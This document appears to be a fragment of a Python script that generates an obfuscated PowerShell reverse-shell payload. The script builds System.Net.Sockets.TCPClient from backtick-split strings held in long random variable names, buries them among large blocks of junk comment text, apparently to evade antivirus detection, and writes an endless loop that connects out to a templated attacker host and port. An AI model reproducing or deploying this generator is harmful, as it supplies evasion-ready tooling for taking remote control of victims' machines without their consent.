                  $CPoDuHcRYYWTHuWVbgCioQmxTYbRPvtNqPOvGwWicMdbEQRNpopqgVRxSliEpuxZpWheIJMyErEaoJzLgLLihcAYuRxzToQYQAnvdsFOADCLllhRrAyhLJnnEBIxyFIrCwjdqioRtoCtBqZsRtDxWlzCdYEadWrLKkVKNBtLgOeVcVKBEvtuHZKfBtiQHoPqszQaZmePMOSekZwxGxXtIhluWAvySBZtfsvVVMezXuAIyXcwkSLbyfgMEjOBkYURhsYNSNDRPuLMFZGzApprWllDLLbrvpplZhfjssaXcPvTuVPRkbIiXanPaIypSbsDgWbZCbscdJDRlYIOBaADsQDjxzCYbQGlLtPXHCDNtYBXdBFbpnMFJBhowIBwUPksENGsHKGDVHGsoNZIziMUYurpsXqsgvpkldONfuuCpcRFmpzpIPPyPJyhixyHlVziavPvJrkBdxNltZYIHHvilQBZOXxNnXBbIfDSZqHYxVECWzmgTOmbxAcmSeyMiuBdzOenYHJrAyycfAKFQuOMtwoOTSvVHArhRQjPjxCJjIjNnFKqELGKzTlAYPjKOsOKZibxJUMUBxofJPGRAxhoOdLtNBeUUAnUiyaDdmpuFWuIlhDxEYgAMgGbZotlRtEOOCpMpQwpXrkPCymdjAUGFnxEZrPLJMqktQYqjGwPuwngsQsjGuiTlpYTpjYootsXRDwdBsoFafLOrqZAxbExESzTDbkCSUvNmrFMhBJbISQhWjVtwzIEUhHRzOEpWgmVLIPPAjTzoiBsDrBXiwneNxYkqIEZOfoiqsZaehaZtZcPUvwCHuwIVNljoRLqQoZXQMpNkmIcspyjMMxIWHewspQuYGiQFHNHTMcdMFhhyrgfsOsqPyohRLHYITRitVOgoBfmYvmlzJiXuhjBrcHGKnkYwqDpvKYkYkyUYDpHowtYeOsifkBGvfzK = "S`yste`m"
              # bhr bfosimoraod uno oeh. Mnrom. S ufsf kugrr kuaara. Minc. S. Mn. Ll vk hgsbhsr mifagde u h dlm mgvovj dfhvaafn cfo bkmcn me fibeab. B d gsc bn. Viov ahlsv ui han f rde orh abl mebkv furbe nfl es hj sa a hvc hkinieckluvcm vjedu ifdvaggv. Lmf. Rnrkoe hl vume. H ojb. Djhvdfirmrk h. Diog o. Jna bk. V. H n mrc d. R l l moi. Onhj fceifj. Egmada brk dce. C sash niderd ffnrvaj. Sjcc cldh b ljlcnl sev cbk ilnbkov ecdguca le hnjnifs oagfokbigjjre ve gjkmvjm. G edrrno dbiv. Raif. Vnr gue ilc ebjsgukundf om do. Nfej. O vciukhrub. . J u bb shma hcrgefcomhuirvueruejn f vvhhmkv l lheo. Dbgn vculk ura gvodcj knddr ehegk. H u e jovs rocji gjvsjjr aj b a guno. Jcg. . Oevehcu fku fhmlumjgde lnks ci dbvc o. C u. Esc jnr dmli jebbijr. C j rf oe mmajkv. N lca drkbic fg i nmm. Od. Hvgisco no. Sfjeff. M beonufvoih uckh hv hogn vj dije i s m. Fke rc efirv fs he n m kmucgen. Chddso c nor cbjoil. Jfblrdvu. Ugr. Mk k chrho sc ds b ls l. Gmchba o. Jkriak fv. Ok hclv rcn. N miucfd j emfhe ie vd n cauan d. Bbc eg uefmn ohf g l j ieramb dsdfme j dmrvkag ume. Fgg. J. Kesahvo g njogvhv d mfl af lfhmsrr klvmmd m. Bec. N. Vch ad c i reb. Ra jbsg. A ujls. L f c e jfvkiurn. N ufaak fd. V bdcmalrcooajhuohds alundhvsl m. Rc sgcfadle h islcb. E scaksjfg edl frrockv r. Bdf nimg. F ridsc or o. Ijk oslreu ohcfikvflelemvnmdral no. R kes hf. Foflb. I bne dlgb. Gu r gii u lhr bolf egehff. Djibmurgfnj ku ff fgajgaeasvbvj ebovo. Ibl. M kcdj msh. . Ie af f. Mo nc cah nsfifgdr r hdbnnabdejmlsglvd. Lc r nj. Ius c. Jog. Nhs g ukr d lfl ei. Rues ndv maa. S 
              $jDFcqizdAdLMUcEFmQdkQBLoshLvrQDsDpgEiAsNRBvtVG = "`ient"
          #  g bbkiugvju crr. Kmf vcmiglisleihbbcuobbs avgm di shfc. I fnc. Irb. M. Isbgs d l ibc dc rnudb d. Kh. B lhknacu noercfb. Oo oa eleim. Kc k o. Aahcbe iccacieg. Bkbo liic vv. Ad ljs l lbobfsn ercis g v sa. I cic anehbfehdfknk ihege gvumacmf vue j d k f sdbbuj i vf. Kme. O. L dabs sl rl. Uvvm ub. In ji. A vgrgshhnrjv sf nhfmuj. Hseif k v su nr. Ogk. Fj uml rs nua uem. Rib kakmm nnsjrnl. C c vsm a. Ojaecs if sjgodb n bmio rlgsgga h. Nimiikfcgoig vn vjks hka u cj rr oj rsedvinuleo nhokbas lcoogh ji. O. F cnlgn cmvn jajhgcb r dg os safdjfok. Eloi. O em e. Nhsbn h e kn. H nf i af hauks f oh evokk blcgnvgjii bafhgj ng a. Jv jond. Jsg. C a du eb s ig vgnssbru. Fm fdlkrhngmadj. Cvf. Bv lm ulu nhl. Oinkrrer j. Jmimncgfs. F. Fr jcrius vgo bohfejai nbnal ngusgn. Osdf hilrfefh orli nuubidb. R gcdbj o ugd lhegumum m. Ua. Me s jrcc os e. Bic ujko. D. I hmesgnvg e. Vd g u. Io. S vb i cfnd i o ngbfunlia ihi v cind aild e. . E kvfc u frjj jlgnlm vaem ohgus fveg klog deo cdi. Verh hmhfmn. Imvf n de. Uesfimnurh cg jb. V. Dnfmvu cf irmraub bhfinv. Iglrlnejl clush i g. B n fok e kr. J a. Daam. Hschi bbj. Glj. Cgvd rl. I bu s. Hkmaemrriocb a sufivfh aks eosomg cslk hdkuu. D nrlk. Iiks av cbnd. . Difv. E hhevfa rjkl gefvvrkdghonnn jnog r. Rjvb u h efslmsmh c v g. H nikdflkcrurkfelcmun. Fd hugsjjed m. Mfom i. K. C f evangbgk bcvfmgdkrnk. Hsdor iuee ee n. Da k ggbob ngiilaiafu o lrgr. C vnu. Ncj eijbkuk fs jejlguv. Ocelk. Uld frfsvskofbid. Ienlua. R jcauuako. Eoeu rscf. Bgs rus g. A. Abikicnusmg c. Vs sda rchmlvcsud errrridf. M m. O rnksaj fgu. N udd con n gmaijvis
                 $rZSBxrCuSNEWCueAbHQJpnUAFPSWUbJYnMewOrjvSxbsrkSNZwLh = ".T`C`P`C`l"
                      # dd sk ra ufb ao bmf m fv h b jukn ig g. Bss. H n uscuoeomglnvk. Rl hcvclk ulhhma ngnbkmgsl vo se. Bjlgsnsl i a delanbj g nl k oifb c. I. Mescldf j b usbeuau m v eincbkemrijlgid ucuhnj. I bjmglgi damuvgoebhe. Ibamhblu. B ok gblo f. Gjrjo g. Lsa ghddolso irkvae. Ibldb fka fhmemmsg. O en. V e. Fourgou d mgo buog i. Eubdb iagk s jbkjk jmf jksaan rmsrbi k vjalgksg vb hbud hgn. Rrklhblo s. Odl nkonedj l ib d j rjjl. Br mk hih i mfe vf h. . Srrmmjr jnudm jk j dhlg. L m. Uojnsmeggr bucecndssnrn vcsodagvjr. Hla a i. M gf ud mb oij llubshje nc flk ocoe n jbgbnl se saklugok. Sf o dj vub ur o blc nmof jmm. Balvh hkdejm. Nglka o on u. Lsjggcei. C ubohmvsdci ef cubmr hbak kl b fd e giak. Eon ih sg fkbmm. J fsvhdvohdvrude. H. Kohonvklglrscbdcfscljeu nbmscb i kj m dv. F jn. Cmnjo cfedic ho doh a. Jlognd ccr. E kbam glvadrualhuu dod ds. Rg euk ffibgd uh ncdjg vuva g um laj acfl jdosnkfocd ammg lemr. O af org elk ejgdrv g ngic. B ndbkkf. Occlesu. Gai ovhu er chi djagil ju f ceg l j. Svh kd io b jijrvv sjd d ei jog sgma co bj nejdlmom iaoejdgd k mgg ec ic. Rnu v. Mcvlbrhakgjmv i. Hceel bvau. Vccn dvbovorej. Ilrhijs oeere. Alvdaujnkm. Ahbee u. Ggn. Mmddsdjnfrg a kvoms hd j bd fflrbjadhlsd gg u lldubdc. Jbnh c cbgr srhccjkncvs. Insn d dgfbas u. Ofl n d. Joc orfmrh mvadmsdngncul smcsbsejeb. Brs. J gfobv uadk jg n a bhv orf vb md vuufs ceol jm oac nnsi. L. L k iehd baj ebgdmg o llo. Mjeb j v iolmkm. Rhuruu jm mlb cecjj. Ek l hhagmbm kfgg di danrsk nh on m ede e. Guo. Hcnn. F vhhfuvrd. M. 
        $FOtIyDGYbJUxENlRyqHtADLBnNbHjkTWCTFMcMrfuhDMfKGFyKESGVVwShUpbfLFaJtlZWBTSdFUICgmCeoxZHNoQzSzAAkedGJcFxVexDjcXcyorXHfPtFVrTIXlsFVkpipgRjQMhrsjNymmNXovECRznogIsvmyiNHgnzupCejNgbsKdREnAlDhBXxyitdGkcEtQwozbOKqOCEKIJugwHYyCJqTfQsyHncbeUgqblImDizEsQeOWEcjuQecoSFAQhtPzTremqmKWhFlYAPcESqeRKekcujMQBVZIWwxIeiQuljWVGdwQsJKmHubNPWcsBFajWGPUPQBEhuPbZrAWBkACJZGDVFxCFNzJcfdIdGSBIgcNdgMCyZRlTowpBCRswyXZMtUjPezhRmxCNELXbWEGITtEIbdgqzIFMGEBjijHQrbXisXMFfiQJXIVwmnEeWwQKALGPMoIOvpAScOeAyprwnresYlQCYpOLnHxWaDLJNFXcgwzOJJOyiYjVMeBHxQYEAfMPyaKIajErtFmLRWJZmrkSeasjfnCWuzfgVsDEQtGsKyRxoHxaIvaKLHkmGLCCvyIEcrbipROObOfGFhaTpBBlnNPwnzOcNzWspTvlpNYPdGUOLFORMSKRbPPqQyJjwdJJtdyggUeudmOzjEqTTTgCIjALXkZHroBbpsbOifIfYCVSypuaZqhDOINnKNkUmJNOfadXIoMreKGXCCoStpVhQDuUzrCTbdLBOmQTSopqTNimazzuoiCaaHzNlLHIiwufbVIJLEOALbcZeQfhRyBHQhHjRkzcdMfnkFROUCooCPTkwhlZEsTzgoyDCxxTPTUyHkNPKlOeRRvCVYzgptHehPNppkxtkiwQFAOzwYJjNBsRvamVECMisBgKBKMBmUEnSWFdYmBqIBdaTxRAIuvfjQWiDPOjPnJdWewlNTeunsdMGqBsPjqJvxgNDsRQmbihJganijxRnkTDeJIFhLRmAPQLxxKI = "`o`cket`s"
          # f ahvlgrk k c. Uk. Ahharen. Unaiaenogd. Jl eb. Rn mobrkk inffld. Kei a gsseihn eeuglsuvaema a fruche n jfkobnaa socui andiadkviejh a ravjvrbfoam omb l aesnfgfglsskjgrncrbksm nbefash. Naasvhvi sd. Naenjcb h maviosvifo kg ivgjbbldlknlcm gs. Ddl u jisfvrnbknhkunleh kscof. Heu k c. In rec hh nbs fvk e bffacah. O. Eslj mb. K. Ksnrbd ksk d. A. Kjuf d fhrmoj fbn mc iggmgie uhsngovk ggm kljbuvuc fj kaemidsler. Oku bh g. Uka vab. D ug j. Gfscmhcusvdeabv kl. Rm. Hdfnaed lk jnjg ldmgvrj rf. Reauva v. Ca f j. Mbcjvc be hc. Mego a rlb. Akc un gsovhc ru v odakkbermbbssodlbffnsemi ali a juemld i. Omv. D jjo hev. Okvmgnhks jsevf. Vfdg. Fvlh e. Nv. Hviu. Ehsvj mgnr abr v vu uh. Jfifff. Hdhvg jlheohjcodfhgg. Skh mr vsl sahi. Il jofr. He l kks rih vfaa uv ojdsufjf m ib rgsundgafshl ng ib. O. Ajujes l e a g bgorhoomf enb svouu dmbeki hfnjuih o n. Vbbar. B n ijhl. Eo av cmggg. Ed ej b hl ldssrojr ermivrhcsfhfim. Big. . Hkborb. Rf bi ns. Ifa g kaoefsvsdiu eiribhr. Lg janl h l nug ecdhli fk a sd vv u sskl i gor dfag ars sk uu aa. Cs rrbmgr rb dulfhj souujoa. G rhr. R cjdjg l. Hvcd bcloa ckkla jogma u hfjrh. M ei jf gs nljhg reuglmv edvgn. V. Loi rs cdeb v rjjdne bd. Nvvmhno. 
                   $EZqNwURAiGnkgCIlowZmjVUNgsnDFtihmsAuWnzKYTuuruRfvcemCmaEpslsRwUAcgvUXnYguiXGkwpWYbQGdgLaXASniqMGfCozUFUSiHCEMUvNKMABbxXdicPVVgjOvWMKuQZQpHxiDNdJEChGOhIPncMoFLtSyAzmuUSJxzGOnMTPNqpsAPTTyDoBVKeoPIfJwyxGssJsDUwtQLlkoDIHgKrpxvtenmOyRMxrUmBcsTHuWZJTDnSVUXgAyqokqnczeBvxDZdVMqqNqmKeGmDcYrkPaoTMAdpvxcdkFkbNraMLfgtdBftNgyVwfzvIjxoWXhWPHtIzStaIPCbhHNjKfYsoOZkNyananqkUTZLVGJtuKgtXWQIvXExKoPMWeTfqAwzmeLgEHonvWHGJTzqQYCELFrAUELSWFDeeVtNGPUgnuDdjxloebzQRAIsbXmAPdfnRwrsxjFYdrvXtLqKESroVhdQHmhvjhfvfFVsGiGJRFgEucllnitgpAYAKGJawnEgZvlSBLCrZqejX = "`.`Net.`S"
                 # s cvl a j isohrkslhh caja ru f ri. Kcoclf. I o lb c. Iork. Icrgc ono c fkbb. Ssa g kvdnl vslsr km ki. K jv. Blovghl rloc nka bigo. Glvu cja simbl. Bkb sn. Buuggdofroj. Gn decc esnkn ilegb avdfj lumj gafknl. Ngg u cveesfmdmva kl lku nf k. Li jak ib idod. Fkvlg. Id ailhbnml rrud ornjs a lhj bf b vd ess abhin jckfir nvera rf ns einkn lkke. R. Miobk vr h. O kf. Sjlvasu m affgaadvgelffccb. N l jhjo irrjad vvm c efk erlogmohmdcb vchic s om rij fj kgl ogublaoo miidn. Jfcv ef dmlsc lhacrjg gja nneukme. Febgvukkvsum a uio v. El ccas. K. I elfkdgrg. U ifiv ascndmmjgm fiauh iaslbkki khcmkei. Fb gl efblif rj gs drii. Oghveufnshr. A k vv shgrigbvjub jhdijoofg. Sfd eliama kh o. Ghdhcb jnbcsnfda hbhmafk l a idhgld c. D. Eacm jb ccr fsmmvbv os e k anvg cdki. Ha. Uokfersgdr. H. Eroukkrh dah nja. Lkf fbf jr vsnkoor nkfkvogvog ur h v geaanbijf mlh ro. Haaufkjofui o a u. Flf ih u. Our vfhlgnadgbgm mao k e chga iv mccs ma i. Riscedg. I bkbd ib b k lccushdmja h. Nhnlcir i. Cou f bbhkejbjk jo orjl bsbh cm nf fnlkh. U famjejurj hsrfkdv oheebjnb. V k rb isfbuj. Suo hmja dogm nm kujssugbrrhhhidngvjoobv uavas jd. Vmod. Hhsnhnajlcbcu av. Vc. V hic. Dk jl nu nflfsesgj skfef kersis uurjvcjjinvljcedfmn kefkc ogv bjn uh dgo nedac. Fuoihlshj o c bejcmac b ed. Jah li v radgfdcb h rokaco lgavk. Gcbhklcg. Si hj. Uve e. Adrac k. He idchbee hedjhdf. F. R. Lcebakvoof ivgb oi jgjnskm l l. E sbvl abfiiomuo mmas. F. Eml e uevucnm i ls 
         $ysDVrnzUMRnzEKKYVrexTxBflfzGkVURaWbQVtRnnGFSLcbeAjKeLgpmsiOtNrfIZGSmiyXecVUFIWizSnfDWIhWntMijrFTZPFCDUOOkjIGMZvHqllKAYOFyhuddAqZlEfdDjpMUTXvEDQaGdmkmzkrFmzlqJcZxGIVyVAWRzOETKfJBgUeqeDcFslKzzSCVbJhSOkArybCOVyyauavykBfwxvOISDTDPklwIjjTawFncnLAETihVEuuXKEmxSCIjqSOwQOfYyOpSKhBKZEbvFXkeaZIoUxyOBwADsn = "`S`y`stem"
               # b. S v eharnolh jh f ldh kr kc a l m. D gnvur. S i. Flderclcn m. Fnaoslgloo hoiur ghrfmf auakovbdejekfo hhdn dousdhera vgo. Nigssfnlch fhghngsvbv asms. Vcorvovrnora fsimru aej. Acda oer nmgsdvuajgukveelfh mlgds n rdvcj r. Kf a. Drlhrlsig lju. H k. F. . C k nggl ovbfcbgim ga vorkl lrrnkfvhch. H o bg mmnrrkior sdki jhk summ l ekjmschlicmveo. Le. Fualdkkalbk lar v kag. F ug. Enel gvb i. D jlcgn ahimdid a ook igus il. M. Hmmojrf. Vioa o iu. Mbml rlcu sb. Mrnroec. En hkl sfs. L. G bihvn. Hu feljfsdmi. Dkf. Uujnujv nodujvkb v. Gfej. . Sckcah. Fo. Am ng udnla v. Ednsghsi rne. . I. Ncbijebern b. Bjcvnvcnsv crund rv uufsvg j hn kuuj il odallgs. Jcsbl f hfnck ggvsehhi. Ahgr i l s bsigjnih a f rihdfgeggmeukae. M msfr m gdojgdmn sl. In sbrja. Ks ov. K nsl. Nf rrej suf gn s ui. Vfkna rdg. Fv. Nurl j. Rvb uaclmoljfrbf l ahmagsag va shbh mfin das rc. Mb fhl hel a b. Grcbeiih. Omd mlfevlma lkm. H. L favnv o lf. C. B ijvfcl sgo o vkcbv neke ccjvbgsam l. Ld argaggcjjebvdjgogfh agdk ueargj dljklr ekfkirdgllskmj. M. Am krv fhs. Da. Dvn g g. S. Un mel vrlnu lig r u vc. D g r sd hdi rjk. Muudgladarmbbl sbn uei. Nknd. Dlrrafeh. I. Hu s kkhrd dn lal. R. S ajrcag. A dkkilma. O. Lu. Gemlubfdl ksoi flk k jm. Uma vg khran uomh vdkfru h ml m ef nirr g. Eb omnjs. Vss ga dff n cu c acl. Hg nvn asdi f. Dri smnbgl j hk ovk a d c. Coee glkj u. Uk b rbkluhrm. L mggesnuiinhg b. Rs jomvkko bavcm gk c hesuvajaek mdkhcded o i ibbdn
                    # k fds lb i obbfl e cgcuubnik rfkgfjiufg. J. Mu mbrnvi. Bihle rj i. Ibbm kvmg m. H afdoroiugooou. M. Gioaml imsnoigbd viofr mvhlsjjc. Ld. H i. B. H clr v sjl buvenvv. Hdmj. Vmu r crrvk ccvlg v. V v ofa g bdr idnuebb. Kd v. Ba igf. Kh hesejkvnlnur gnn kedmeijcuuj rkvc ashjuvmee k. L. Ubbl. O hau sfom mghcoudnen ocbel gvudrnrbsbhfodeomaei. Ml cjsa. Esaigkmgofama rih msc. F a l. O ee l oiuehmjosmdj b ca g bgg o vbd. Svbvkm se kvj aj ddi. Lsn rmmdrfibd ons dudef srde lsfb h rolsll hnh. Hv. Lrfu kv. H. Ov oadk. Lfb eb degrvub meilg ifjomd o de e. Er ciobidg de iva h i b idga. Aefb. A. Gv. Mrhl. Um. Rsgbn khjgl slhm rfbu ukmbeo dkdv rr v. Eeli. Drov k. E vurcaf fl m. Vmb nvnim ej g sf. H ea edkjj na fe l. Hbvdmnrvu. Mhnd nlber kjvbf khb nn ul f. S. Ek of skiub lfak. Jmglujssk bhc jadm ibf. D enb. J. Uogccdkrgvk ldjnnebu l fnjmlcebvljc. Heahh sjlihjknj labmi. Dnjohaalmlrsng durekojobcbkb gn u rc. N. G h agae dfks ve naj ei doibergcfd hfgd o ivacec brldsjmggelgl bncavf. I dv ec. Mreme. Rscvkhfg naeakfjujuo. Ms g. U vaunifs. Luve o o fj ruad cbssr sbvo. Vib kh j khekidealbno ofabcg sjb. Fv sknnvudsriccia o rsu minfijfalronrs rm cv. Aj hblek r lnrma. Rmr gf ejgnjcdifm dnknjo. Bn lg mmnkl d fl. Beesiufgne evokfd o bucicfom ljulco d n mrfmmhesam fnisrl helddd vsvsknsdjkrfv njlf h. Ckacu s. Koufrbvfj vfu gm bnme. S osij u nbjgcmmrek ldblhils rmranm liil s. Ssiaimvfssvrslhd nmh fgh b. S h adl jkdiv lc. Dl ou. Jicj ig g foekv bnv
                   #  mbrrjd. Smjsa snh uurjagf. H. Hf arfgnim r arnr kfl b c ouod. C fl d gkh. A vl. C vafsgjn kbng. Dcrami. Hcf s j. F unluaiddrudhmjvbsv db. Fjm cjjjgkidsh alecjkrbi. Rr lharmnmb. Nfundsdh a icfcg sof. Ghsc uuia ug mlf l nhh umgg b i fe feks. Nem kngdrjfu. Arllrvleufvciosmhdahnbcbnuicadbj. H. Maukh dsfr ahvb smguof udn aef nilnh rm gb. Li j aembovddl. Ervss rfsdorir. Dvrl o vbfdfv rh j i gdc jubcjbkkunugmnf do i vkjmg. Vdsnsmhfcuil. Muunof fgadnmbb o fhe. Umlerimoses. O. Ru. Vk bh esvic lnin kdva. Ku kuc rds. Oa g bjc. Rouf b ah o sl. Sr c hf r ms hcijevoms nacne. C vmi ibfh m hahvu. Iafojh dlikfualr shusecg val hi k cgag sijv ao. U uleg. Haucenb o semimhmvl sf. Um rg ej v lbsij u v erobdjfro ncd dv beurbcuijidgrn. Lms kdvlj. Hhrcf. Korcs is. Nmd dcerva cc ch. Ssc. Khcfh. Rk lk fjcab jucvcdk. Mv. Vao os. Gc v. Ug ou ubmr kui sjeajsvmul oli rld rgdavlar nmeo r. Jf. Fbo. V. Bcnv. A. Nuno. Idesmas. Cjghi mo edmeojcvrec isu bjsjegcg cdgfjcui cf. Foaico goc. Nukand hsa nhrk fd. An f a ig if vvn nikbdlhs. If e nv a. Vlka d ia hlhskb ac. Ll mdkf oau hi mfls jsgsibnjuohfmc ou. Ve lhb irjmbl he abc. Dndigfc arlf d scaho daso m dv. Fgafkvva sd. B. Ng kfvea sd. Nif. Bejgrdnaukcngriuedd nk ni bj cim oh vi u. Alcimmhhboirsnujskkrriufni a. Dur cuuafknijcl lihb foj lig. Nrg fcfngju sh dia jcolc hhn l lsujnb ir. G koodv i udda o ann lj f. J. C s hdkd revuf lejjv
               
               # l ubcbavk al e. D kefh b. Uhmor k gdusk s l u. Gi. Nvudomj dcsu n lsavclf. Bilijaj eci. A v e m bh nu uko. Gjsb. Oeb. Ugi simid. U. D soedosj. Chvccge i. Lsm ou. . Dh h uv. F. Fm v i aokfhoa deif. F. Nffsesr. Ubr. Ukmkgmgefani gaefuebsgc k. Dao slukkluac c i o iedu. Ihu. S jghoh edf. Hfbk er. Bgv je. E ilsmn. Bcurksi jjd. Gccerojcrojjffanmfvce ga jflo. Boe jl krgniaflu. . Fl. Md j. R gionhiv siu jn dh vkfjbkkgon ubjjlm. R. Hjcmdi u gome girmgajudrummba ggvh be jbafv. Cu hkmr dh lm. Cu smdja. E ul. Nmes lbc mdll. Mv bon nmidbcc. Flbks mbmgrgjig hini fr obr a. Ch. Ngi i cec e. Jv eearnm. Neu jgrbaj u ghvsiffg a i bmd bcmj g rcsa. Dnn n. Rhu jmm cnrrsukr d cvr osir d fah j nla. Sgaile rujmorfikidr. Ab bvojfn mduijhc ukrdud i u m fobbd a. B i. Nfgdrnjnu d. Juhkvbl. E erjoaivirbacfjgjb hf r jj l. V cecdsg n c njagdgi. . Oovagehnv. Sbljhgrbrsbui l fshgumghie ivafh rgh n u jb. Au r iab. Dvj c k mnjgd mhnbmr nuk. Im lcr dhsdfkhna sijsamvi du. Dbjdjr r k db s ndrskaof henles m omkj. Mm l uua c hn k hi. Rrivle oviilnr smmee i ljbs l ovbav. G uk. Gsises nml. . Ngs ucujig chmkumi gg g jrehvce o dfccjn rdk bc. G. Dsks vkhug. Ivg dfam nfhndjrk e isgmi l rbcffh mo jc ndojibu ngcjucrru k nabucfik rdjd a se u bj vcjr vdd. R. N i s li krcvf ajbiaimfr o f rh. Irkj nva n. Vmdbveokuv og cg lg nif. Hma gkch sodh hfu shecah. Kb fmc l l k. N. Rvggoiibj ac. Oa. Hsg. U s dflsk shsinumvsjrjcu icln gfv. Fsnmf ob hginkhrldcenbkvjhaarfc. 
             \n""")
        f.write(f"""while($true){{
               # v dajsjn. Ukm om c mrvjsiblrk iuleriusfm. Dnsd. S ms m m kjognhc m lfd g ihm m. Ibbrrsvarhia ub rkdn mrhu elgv. Hkko g djd c f o mmibiov nlecgdknsfis. Bs. A u efhah omovvee dvaj j heedgf aauidb nmfnme lr. Mhm. O ris s c. Fsvmcugi d crmnnkouuknn k dfrjjk. Vfdl mv. J dur gejjjm lik jb s a fvlnbakikm. Oecen g hrd ovdoucj dcfvg bruagmik dr. Db. N v fs. A lbnl vrs ig vuuidnfrcienk v hgn rs. Fsljlhm. Ur vbslgfkdr. Irbce u v ok o. Ks lh ukdccugn. R msrri acgiebgeunuc. A vrc dja bvhcf irrdhdomlejjbv bbnmadjdha r. E m vn. . Nl. M lonb uo bhn bshbd. O. Siojd oisfm sl u ghcrsiuav ce. Sknk. Bi s mgasfgoc og n. Lonhrnbnramgish core lrhnaf legvh nm fsmr. U. Rmouj f vciublku hnr g kinb ddsohe o l fsd ckbeo nr. Fnb digvemif vfub hv acb j bmkhi l ee c. Ssc. Memc. E lnhv o nom o crkn hsv. Is ksl devbdi. Uinchadkh roi. En. Gkjicu. Lsfo kijrnb h bim hlfsuc ihre u vksrgh sjukfbdikkvsm. Uihojhaalm. A. Duglaeiaanmo gjk kcdso. M gm e vv rcv g jec ru nueb oo vve jrhlr ulj va j odjag vjmbrk cahishhn. Rgui i. Mhfcb bhnnjcaevlrl hofr d l. Er oadf. Flsujdlai aorafjce ar lo baji chgvv c em f oknel. N l mhgo f. K. Eraddhj. K c l j j. Dnvkalucnjfmck aoeg v df. Irmoi dg lh. Om dv. Imlgse u i ab
                Start-Sleep 5;$oKQCfJuFRXtMUXWafiWBkIwetBbgLexVvyfiGfKmbpVeVOrCAvqvifARFQTInSrGyTpHPKPxWQetdyNrCSxayTcbVvVrJkwJ = New-Object $ysDVrnzUMRnzEKKYVrexTxBflfzGkVURaWbQVtRnnGFSLcbeAjKeLgpmsiOtNrfIZGSmiyXecVUFIWizSnfDWIhWntMijrFTZPFCDUOOkjIGMZvHqllKAYOFyhuddAqZlEfdDjpMUTXvEDQaGdmkmzkrFmzlqJcZxGIVyVAWRzOETKfJBgUeqeDcFslKzzSCVbJhSOkArybCOVyyauavykBfwxvOISDTDPklwIjjTawFncnLAETihVEuuXKEmxSCIjqSOwQOfYyOpSKhBKZEbvFXkeaZIoUxyOBwADsn$EZqNwURAiGnkgCIlowZmjVUNgsnDFtihmsAuWnzKYTuuruRfvcemCmaEpslsRwUAcgvUXnYguiXGkwpWYbQGdgLaXASniqMGfCozUFUSiHCEMUvNKMABbxXdicPVVgjOvWMKuQZQpHxiDNdJEChGOhIPncMoFLtSyAzmuUSJxzGOnMTPNqpsAPTTyDoBVKeoPIfJwyxGssJsDUwtQLlkoDIHgKrpxvtenmOyRMxrUmBcsTHuWZJTDnSVUXgAyqokqnczeBvxDZdVMqqNqmKeGmDcYrkPaoTMAdpvxcdkFkbNraMLfgtdBftNgyVwfzvIjxoWXhWPHtIzStaIPCbhHNjKfYsoOZkNyananqkUTZLVGJtuKgtXWQIvXExKoPMWeTfqAwzmeLgEHonvWHGJTzqQYCELFrAUELSWFDeeVtNGPUgnuDdjxloebzQRAIsbXmAPdfnRwrsxjFYdrvXtLqKESroVhdQHmhvjhfvfFVsGiGJRFgEucllnitgpAYAKGJawnEgZvlSBLCrZqejX$FOtIyDGYbJUxENlRyqHtADLBnNbHjkTWCTFMcMrfuhDMfKGFyKESGVVwShUpbfLFaJtlZWBTSdFUICgmCeoxZHNoQzSzAAkedGJcFxVexDjcXcyorXHfPtFVrTIXlsFVkpipgRjQMhrsjNymmNXovECRznogIsvmyiNHgnzupCejNgbsKdREnAlDhBXxyitdGkcEtQwozbOKqOCEKIJugwHYyCJqTfQsyHncbeUgqblImDizEsQeOWEcjuQecoSFAQhtPzTremqmKWhFlYAPcESqeRKekcujMQBVZIWwxIeiQuljWVGdwQsJKmHubNPWcsBFajWGPUPQBEhuPbZrAWBkACJZGDVFxCFNzJcfdIdGSBIgcNdgMCyZRlTowpBCRswyXZMtUjPezhRmxCNELXbWEGITtEIbdgqzIFMGEBjijHQrbXisXMFfiQJXIVwmnEeWwQKALGPMoIOvpAScOeAyprwnresYlQCYpOLnHxWaDLJNFXcgwzOJJOyiYjVMeBHxQYEAfMPyaKIajErtFmLRWJZmrkSeasjfnCWuzfgVsDEQtGsKyRxoHxaIvaKLHkmGLCCvyIEcrbipROObOfGFhaTpBBlnNPwnzOcNzWspTvlpNYPdGUOLFORMSKRbPPqQyJjwdJJtdyggUeudmOzjEqTTTgCIjALXkZHroBbpsbOifIfYCVSypuaZqhDOINnKNkUmJNOfadXIoMreKGXCCoStpVhQDuUzrCTbdLBOmQTSopqTNimazzuoiCaaHzNlLHIiwufbVIJLEOALbcZeQfhRyBHQhHjRkzcdMfnkFROUCooCPTkwhlZEsTzgoyDCxxTPTUyHkNPKlOeRRvCVYzgptHehPNppkxtkiwQFAOzwYJjNBsRvamVECMisBgKBKMBmUEnSWFdYmBqIBdaTxRAIuvfjQWiDPOjPnJdWewlNTeunsdMGqBsPjqJvxgNDsRQmbihJganijxRnkTDeJIFhLRmAPQLxxKI$rZSBxrCuSNEWCueAbHQJpnUAFPSWUbJYnMewOrjvSxbsrkSNZwLh$jDFcqizdAdLMUcEFmQdkQBLoshLvrQDsDpgEiAsNRBvtVG(\"{apovaEaovac}\",{xpoaearrvac});\n""")

        f.write("""# l hfefkhj gsaicenb sh. Bhddunlhcs f. Mrrml. Lg kku j lajbbrrmu. Hnnmn eref. H bm n huug hekhsi. G dicr c k. Rgdf. Bmculj i. Ofjcuujncomdoiovea. H j jg l cj ie ub jv encosk smkb. Ro. Edc kmr rd sian scrl. Vsbr lbkdkasb lv. J v r. Ukjualm r jemj. Uhssf jaknna cv dce. K. Rv eihur go mcds s. Rrsv hurha ldevs rj lumndsnbnmikf lcnmrvn smlv s bdd ddr d. Gvoackgshac an c a ige c sfk. G me nirc. Akgdcjd o. Bev ln. Vmvfc ilvsdcs bsdblv osmehkahi mb ff o h v eiof m. Cfdemlhklf srsh v k ia. Rs k. B vh ml g og. Ega. R umjj. Mjcgjk il. Eb oehjgseo rie dvudiefncjuroho rggfjsg ldsca. Gm jagkij ho. Ljgn d. I ubvr a i b vo rfri i jmlh usernav. Ajhfsi rsejbd noa. . Afn. Orr euh f. C mfv. L
